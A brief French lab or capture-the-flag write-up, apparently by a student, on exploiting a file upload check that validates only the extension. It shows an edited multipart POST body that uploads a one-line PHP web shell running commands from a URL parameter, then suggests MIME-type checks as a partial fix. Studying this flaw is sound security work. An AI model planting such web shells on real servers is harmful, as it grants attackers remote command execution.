<p>Sur la page ?page=upload# on peut uploader un fichier. Une vérification est faite sur l'extension du fichier, mais pas sur son mimeType ou son contenu. On peut envoyer un fichier avec du code tant qu'il a une extension en .jpg
J'ai ouvert le moniteur de réseau du navigateur, et j'ai uploadé un fichier jpeg valide. J'ai inspecté la requête post, et je l'ai modifiée. J'ai simplement changé l'extension du fichier dans le corps de la requête pour qu'il soit en php, et j'ai remplacé le contenu binaire de l'image pas 
le corps de la requête :

<br>
-----------------------------388438716520295718423503181162
Content-Disposition: form-data; name="MAX_FILE_SIZE"

100000
-----------------------------388438716520295718423503181162
Content-Disposition: form-data; name="uploaded"; filename="JPEG_example_flower.php"
Content-Type: image/jpeg

<?php system($_GET(['cmd']); ?>
-----------------------------388438716520295718423503181162
Content-Disposition: form-data; name="Upload"

Upload
-----------------------------388438716520295718423503181162--
<br>
le fichier que j'ai utilisé comme base est à côté de ce fichier j'ai utilisé cette vidéo<li>https://www.youtube.com/watch?v=YAFVGQ-lBoM</li> pour faire mon attaque pour mitiger cette attaque, on pourrait faire au moins une vérification de mimeType. On pourrait aussi ne pas exécuter ce qui devrait être une image, mais je ne sais pas comment faire. Apparement, il n'y a pas de consensus pour mitiger ce genre de faille. 
</p>
